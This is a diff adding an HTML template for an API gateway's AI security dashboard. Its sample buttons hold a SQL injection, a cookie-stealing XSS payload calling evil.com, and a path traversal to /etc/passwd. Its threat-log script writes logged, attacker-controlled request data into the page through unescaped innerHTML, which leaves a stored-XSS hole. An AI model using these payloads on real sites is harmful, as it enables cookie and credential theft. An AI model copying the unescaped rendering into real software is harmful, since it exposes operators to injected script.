@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Security &amp; Anomaly Radar | API Gateway Platform</title>
+    <link rel="stylesheet" th:href="@{/css/dashboard.css}">
+</head>
+<body>
+
+    <!-- Header Navigation -->
+    <div th:replace="~{fragments/navbar :: navbar('security')}"></div>
+
+    <main class="main-content">
+        <!-- Page Header -->
+        <div class="page-header">
+            <h1 class="page-title">AI Threat Detection &amp; Anomaly Radar</h1>
+            <p class="page-subtitle">Real-time deep packet anomaly inspection, automated SQLi/XSS blocking, and predictive traffic scaling analytics.</p>
+        </div>
+
+        <!-- 4 Security KPI Cards -->
+        <div class="grid-4">
+            <div class="card card-hover metric-card">
+                <div class="metric-info">
+                    <h3>Global Anomaly Index</h3>
+                    <div class="metric-value" id="sec-anomaly-score" style="color: var(--primary);">12.4%</div>
+                    <span class="metric-badge" style="background: var(--success-light); color: var(--success);">Normal Baseline</span>
+                </div>
+                <div class="metric-icon-box icon-blue">🧠</div>
+            </div>
+
+            <div class="card card-hover metric-card">
+                <div class="metric-info">
+                    <h3>Threats Blocked</h3>
+                    <div class="metric-value" id="sec-blocked-count" style="color: var(--danger);">34</div>
+                    <span class="metric-badge" style="background: var(--danger-light); color: var(--danger);">Auto-Quarantined</span>
+                </div>
+                <div class="metric-icon-box icon-red">🛡️</div>
+            </div>
+
+            <div class="card card-hover metric-card">
+                <div class="metric-info">
+                    <h3>Suspicious Flagged</h3>
+                    <div class="metric-value" id="sec-flagged-count" style="color: var(--warning);">89</div>
+                    <span class="metric-badge" style="background: var(--warning-light); color: var(--warning);">Under Surveillance</span>
+                </div>
+                <div class="metric-icon-box icon-amber">⚠️</div>
+            </div>
+
+            <div class="card card-hover metric-card">
+                <div class="metric-info">
+                    <h3>AI Forecast Status</h3>
+                    <div class="metric-value" style="font-size: 1.35rem; color: var(--success);">STABLE</div>
+                    <span class="metric-badge" style="background: var(--primary-light); color: var(--primary);">Confidence: 94.2%</span>
+                </div>
+                <div class="metric-icon-box icon-indigo">🔮</div>
+            </div>
+        </div>
+
+        <!-- Section: Interactive AI Payload Inspector Sandbox -->
+        <div class="card card-hover" style="margin-bottom: 2rem;">
+            <div class="card-header">
+                <div class="card-title">
+                    <span>🔬</span> Interactive AI Anomaly &amp; Payload Inspector
+                </div>
+                <span class="badge-code code-2xx">Deep Regex &amp; Heuristics</span>
+            </div>
+
+            <p style="font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 1rem;">
+                Test any request snippet or query payload to see the AI engine calculate real-time threat scores and recommend actions.
+            </p>
+
+            <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                <button class="btn btn-secondary btn-sm" onclick="setTestPayload('\' UNION SELECT username,password FROM users--')">Sample SQL Injection</button>
+                <button class="btn btn-secondary btn-sm" onclick="setTestPayload('<script>fetch(\'http://evil.com/steal?c=\'+document.cookie)</script>')">Sample XSS Attack</button>
+                <button class="btn btn-secondary btn-sm" onclick="setTestPayload('../../etc/passwd')">Sample Path Traversal</button>
+                <button class="btn btn-secondary btn-sm" onclick="setTestPayload('{\"name\":\"High Performance Server\",\"sku\":\"SRV-99\",\"price\":199.99}')">Clean Valid Payload</button>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Inspect Payload Text / Query Parameters</label>
+                <input type="text" id="ai-test-payload" class="form-control font-mono" value="' UNION SELECT username,password FROM users--">
+            </div>
+
+            <button class="btn btn-primary" style="margin-bottom: 1.25rem;" onclick="testAiPayload()">
+                Analyze Payload with AI Engine ⚡
+            </button>
+
+            <div id="ai-test-result"></div>
+        </div>
+
+        <!-- Section: Live Threat Log Stream -->
+        <div class="card card-hover" style="margin-bottom: 2rem;">
+            <div class="card-header">
+                <div class="card-title">
+                    <span>📋</span> Real-Time Security Threat Stream
+                </div>
+                <button class="btn btn-secondary btn-sm" onclick="loadRecentThreats()">Refresh Log 🔄</button>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Origin IP</th>
+                            <th>Endpoint Target</th>
+                            <th>Method</th>
+                            <th>Threat Classification</th>
+                            <th>Threat Score</th>
+                            <th>Action Taken</th>
+                            <th>Timestamp</th>
+                        </tr>
+                    </thead>
+                    <tbody id="threats-table-body">
+                        <tr>
+                            <td><code>198.51.100.42</code></td>
+                            <td><code>/api/products?search=' UNION SELECT...</code></td>
+                            <td><span class="badge-method badge-get">GET</span></td>
+                            <td><span class="badge-code code-5xx">SQL_INJECTION</span></td>
+                            <td><strong style="color: var(--danger);">95.0 / 100</strong></td>
+                            <td><span class="metric-badge" style="background: var(--danger-light); color: var(--danger);">BLOCKED</span></td>
+                            <td style="color: var(--text-muted); font-size: 0.8rem;">Just now</td>
+                        </tr>
+                        <tr>
+                            <td><code>203.0.113.19</code></td>
+                            <td><code>/api/auth/register</code></td>
+                            <td><span class="badge-method badge-post">POST</span></td>
+                            <td><span class="badge-code code-5xx">XSS_ATTACK</span></td>
+                            <td><strong style="color: var(--danger);">85.0 / 100</strong></td>
+                            <td><span class="metric-badge" style="background: var(--danger-light); color: var(--danger);">BLOCKED</span></td>
+                            <td style="color: var(--text-muted); font-size: 0.8rem;">2 mins ago</td>
+                        </tr>
+                        <tr>
+                            <td><code>192.0.2.78</code></td>
+                            <td><code>/api/orders/../../etc/passwd</code></td>
+                            <td><span class="badge-method badge-get">GET</span></td>
+                            <td><span class="badge-code code-5xx">PATH_TRAVERSAL</span></td>
+                            <td><strong style="color: var(--danger);">90.0 / 100</strong></td>
+                            <td><span class="metric-badge" style="background: var(--danger-light); color: var(--danger);">BLOCKED</span></td>
+                            <td style="color: var(--text-muted); font-size: 0.8rem;">5 mins ago</td>
+                        </tr>
+                        <tr>
+                            <td><code>203.0.113.55</code></td>
+                            <td><code>/api/auth/login</code></td>
+                            <td><span class="badge-method badge-post">POST</span></td>
+                            <td><span class="badge-code code-4xx">RATE_ABUSE</span></td>
+                            <td><strong style="color: var(--warning);">65.0 / 100</strong></td>
+                            <td><span class="metric-badge" style="background: var(--warning-light); color: var(--warning);">THROTTLED</span></td>
+                            <td style="color: var(--text-muted); font-size: 0.8rem;">12 mins ago</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Section: AI Predictive Traffic Forecast -->
+        <div class="card card-hover">
+            <div class="card-header">
+                <div class="card-title">
+                    <span>🔮</span> AI Traffic Forecasting &amp; Capacity Advisor
+                </div>
+                <span class="badge-code code-2xx">Autoregressive Model</span>
+            </div>
+
+            <div class="grid-3" style="margin-bottom: 1rem;">
+                <div class="card" style="padding: 1rem; border-color: var(--border-color);">
+                    <div style="font-size: 0.8rem; color: var(--text-muted);">Current Throughput</div>
+                    <div style="font-size: 1.6rem; font-weight: 800; color: var(--primary);">18.5 req/s</div>
+                </div>
+                <div class="card" style="padding: 1rem; border-color: var(--border-color);">
+                    <div style="font-size: 0.8rem; color: var(--text-muted);">Predicted Next 5 Min</div>
+                    <div style="font-size: 1.6rem; font-weight: 800; color: var(--indigo);">21.8 req/s</div>
+                </div>
+                <div class="card" style="padding: 1rem; border-color: var(--border-color);">
+                    <div style="font-size: 0.8rem; color: var(--text-muted);">Capacity Recommendation</div>
+                    <div style="font-size: 1.6rem; font-weight: 800; color: var(--success);">MAINTAIN</div>
+                </div>
+            </div>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">
+                Model evaluates sliding window variance and derivative velocity to pre-warm microservice thread pools prior to traffic spikes.
+            </p>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>API Gateway &amp; Microservices Platform • AI Security Operations</div>
+    </footer>
+
+    <script th:src="@{/js/dashboard.js}"></script>
+    <script>
+        function setTestPayload(text) {
+            document.getElementById('ai-test-payload').value = text;
+            testAiPayload();
+        }
+
+        async function loadRecentThreats() {
+            try {
+                const res = await fetch('/api/ai/threats');
+                if (!res.ok) return;
+                const threats = await res.json();
+                if (!threats || !threats.length) return;
+
+                const tbody = document.getElementById('threats-table-body');
+                tbody.innerHTML = threats.map(t => `
+                    <tr>
+                        <td><code>${t.clientIp}</code></td>
+                        <td><code>${t.endpoint}</code></td>
+                        <td><span class="badge-method badge-${(t.httpMethod||'GET').toLowerCase()}">${t.httpMethod||'GET'}</span></td>
+                        <td><span class="badge-code ${t.threatScore >= 80 ? 'code-5xx' : 'code-4xx'}">${t.threatType}</span></td>
+                        <td><strong style="color: ${t.threatScore >= 80 ? 'var(--danger)' : 'var(--warning)'};">${t.threatScore} / 100</strong></td>
+                        <td><span class="metric-badge" style="background: ${t.actionTaken === 'BLOCKED' ? 'var(--danger-light)' : 'var(--warning-light)'}; color: ${t.actionTaken === 'BLOCKED' ? 'var(--danger)' : 'var(--warning)'};">${t.actionTaken}</span></td>
+                        <td style="color: var(--text-muted); font-size: 0.8rem;">${(t.createdAt || '').substring(0, 19).replace('T', ' ')}</td>
+                    </tr>
+                `).join('');
+            } catch (e) {
+                console.warn('Threats loading notice:', e);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            testAiPayload();
+            loadRecentThreats();
+        });
+    </script>
+</body>
+</html>
